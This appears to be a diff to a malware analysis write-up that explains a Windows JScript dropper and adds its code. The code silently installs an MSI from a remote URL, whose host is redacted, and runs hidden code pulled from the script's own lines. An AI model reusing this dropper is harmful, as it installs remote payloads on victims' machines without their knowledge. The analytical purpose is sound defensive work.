@@ -15,5 +15,53 @@ The variable `a` employs an Immediately Invoked Function Expression (IIFE), enca
 The `a.j()` invocation initiates the execution sequence by calling the `j` method of the `a` object. This method, in turn, endeavors to execute the embedded script discovered within the current script file.
 
 ```js
-
+function installFromURL() {
+        var installer;
+        var msiPath;
+        try {
+            installer = new ActiveXObject("WindowsInstaller.Installer");
+            installer.UILevel = 2;
+            msiPath = "http://<snip>/<filename>.msi";
+            installer.InstallProduct(msiPath);
+        } catch (e) {
+            WScript.Echo("failed: " + e.message);
+        }
+    }
+    installFromURL();
+    
+    var a = (function() {
+        var b = new ActiveXObject("Scripting.FileSystemObject"),
+            c = WScript.ScriptFullName,
+            d = "";
+    
+        function e() {
+            if (!b.FileExists(c)) return;
+    
+            var f = b.OpenTextFile(c, 1);
+            while (!f.AtEndOfStream) {
+                var g = f.ReadLine();
+                if (g.slice(0, 4) === "") d += g.substr(4) + "\n";
+            }
+            f.Close();
+        }
+    
+        function h() {
+            if (d !== "") {
+                var i = new Function(d);
+                i();
+            }
+        }
+ 
+        return {
+            j: function() {
+                try {
+                    e();
+                    h();
+                } catch (k) {}
+    
+            }
+    
+        };
+    })();
+    a.j();
 ```
